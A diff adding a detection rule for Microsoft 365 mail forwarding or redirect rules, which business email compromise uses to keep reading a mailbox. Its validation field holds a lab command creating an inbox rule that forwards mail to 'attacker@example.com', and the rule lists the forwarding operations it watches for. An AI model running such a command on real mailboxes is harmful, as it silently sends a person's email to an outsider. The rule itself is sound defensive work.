@@ -1,0 +1,38 @@
+title: M365 Mailbox Forwarding or Redirect Rule Created
+id: 9a095753-b696-4025-bc7e-tyrian000083
+status: experimental
+description: >
+  Detects an inbox rule or mailbox setting that forwards or redirects mail to
+  another address. Business email compromise uses it to keep reading a
+  mailbox after the password is reset.
+references:
+  - https://attack.mitre.org/techniques/T1114/003/
+author: Tyrian
+date: 2026/09/28
+logsource:
+  product: m365
+  service: exchange
+detection:
+  selection:
+    Operation:
+      - 'New-InboxRule'
+      - 'Set-InboxRule'
+      - 'Set-Mailbox'
+      - 'UpdateInboxRules'
+  forwarding:
+    Parameters|contains:
+      - 'ForwardTo'
+      - 'RedirectTo'
+      - 'ForwardAsAttachmentTo'
+      - 'ForwardingSmtpAddress'
+  condition: selection and forwarding
+validation:
+  atomic: T1114.003
+  fire: |-
+    New-InboxRule -Name fwd -Mailbox <lab-user> -ForwardTo attacker@example.com
+falsepositives:
+  - Users forwarding to a personal address where policy allows it
+level: high
+tags:
+  - attack.collection
+  - attack.t1114.003
